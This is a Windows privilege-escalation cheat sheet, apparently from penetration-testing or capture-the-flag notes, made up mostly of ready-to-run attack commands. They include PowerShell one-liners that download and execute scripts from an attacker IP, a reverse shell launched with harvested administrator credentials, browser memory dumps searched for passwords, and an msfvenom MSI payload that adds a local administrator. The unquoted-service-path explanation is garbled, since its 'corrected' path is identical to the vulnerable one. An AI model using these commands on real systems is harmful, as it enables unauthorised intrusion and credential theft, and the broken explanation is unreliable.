# Privesc Openings

## Windows Exploiter Suggester

```bash
# https://github.com/bitsadmin/wesng

# 1. Copy and paste into system.txt in kali
Systeminfo	

# 2. Update windows exploit suggester. Will generate a .xls file 
python windows-exploit-suggester.py --update	

# 3. Start suggesting an exploit
python windows-exploit-suggester.py --database <generated xls> --systeminfo system.txt	

```

## Sherlock

### Find All Vulns

```c
# find-allvulns 1
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/Sherlock.ps1')	
find-allvulns

# find-allvulns 2
powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; find-allvulns}"	


```

### PowerUp Invoke-AllChecks

```c
# Start powershell
powershell.exe -exec bypass	

# Download powerup
(New-Object Net.WebClient).DownloadFile('http://10.10.14.32/PowerUp.ps1','C:\Users\Destination\Folder\PowerUp.ps1')	

# Import script
Import-Module .\PowerUp.ps1	

# Start checks
Invoke-AllChecks	
```

#### Alternatively

```c
# Download
powershell (new-object net.webclient).downloadfile('http://10.10.14.32/PowerUp.ps1','C:\Users\tolis\Videos\PowerUp.ps1')

# Import Module
powershell Import-Module .\PowerUp.ps1

# start Checks
Powershell Invoke-AllChecks

# oneliner to start checks
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```

## DLL Hijacking \(PowerUp\)

```c
# With powershell/Powerup
Find-ProcessDLLHijack
Find-PathDLLHijack
Write-HijackDll 

```

## Dump Process

Dump process \(eg. Browser\) to find credentials. Transfer to kali and 'Strings' grep for login or passwords

```bash
# powershell 
Get-Process firefox

# Kali
.\procdump64.exe -accepteula -ma <PID> <DumpName.dmp>

Strings <DumpName.dmp> | grep login
Strings <DumpName.dmp> | grep password
```

## Using Token and AutoLogon creds

PowerUp Invoke-AllCheck should find plaintext pass. Create privilege object to run reverse shell.

```c
# With powershell/Powerup
Get-RegistryAutoLogon

#Create credential object
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('administrator',$SecPass)

# Call reverse shell using credentials
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/HackedAgain.ps1')" -Credential $cred
```

## "AlwaysInstallElevated" privesc

Always Install Elevated to create privesc user after installation.

```c
# for HKCU registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# or HKLM registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# With powershell/PowerUp)
Import-Module Privesc
Get-RegistryAlwaysInstallElevated


# Create msfvenom setup file
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi

#Run in victim machine
msiexec /quiet /qn /i setup.msi
```

## ICALCS 

Look for Folder permissions for \(W\) permissions. Overwrite with binary payload. For WinXP and Below: use cacls

```c
icacls "C:\Program Files (x86)\Program Folder" 
```

## Unquoted Service Paths

Privesc by uploading binary payload in service path to be executed eg. By service start/stop or reboot.   
How? Suppose we found: `C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe`If you look at the registry entry for this service with Regedit you can see the ImagePath value is: `C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe` 

To be prevent it being exploited, the path should have been:  `C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe` When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find in sequence, hitting our exploit payload.

```text
C:\Program.exe
C:\Program Files.exe
C:\Program Files(x86)\Program Folder\A.exe
```

